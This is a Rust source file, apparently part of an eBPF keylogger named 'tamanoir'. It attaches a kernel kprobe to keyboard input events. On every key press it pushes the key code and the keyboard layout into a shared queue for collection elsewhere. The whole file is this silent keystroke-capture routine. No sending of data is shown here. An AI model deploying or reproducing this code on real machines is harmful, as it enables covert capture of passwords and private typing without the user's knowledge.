use aya_ebpf::{macros::kprobe, programs::ProbeContext};
use aya_log_ebpf::debug;

use crate::common::{KeyEvent, DATA, KEYBOARD_LAYOUT};
const KEY_EVENT: u32 = 1;

#[kprobe]
pub fn tamanoir_kprobe(ctx: ProbeContext) -> u32 {
    match kprobe_process(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret,
    }
}

fn kprobe_process(ctx: ProbeContext) -> Result<u32, u32> {
    let layout: u8 = unsafe { core::ptr::read_volatile(&KEYBOARD_LAYOUT) };
    let event_type: u32 = ctx.arg(1).ok_or(0u32)?;
    let code: u32 = ctx.arg(2).ok_or(0u32)?;
    let value: u32 = ctx.arg(3).ok_or(0u32)?;

    if event_type == KEY_EVENT && value == 1 && code <= 255 {
        debug!(&ctx, "key: {}", code);
        let e = KeyEvent {
            layout,
            key: code as u8,
        };
        let _ = DATA.push(&e, 0);
    }

    Ok(0)
}
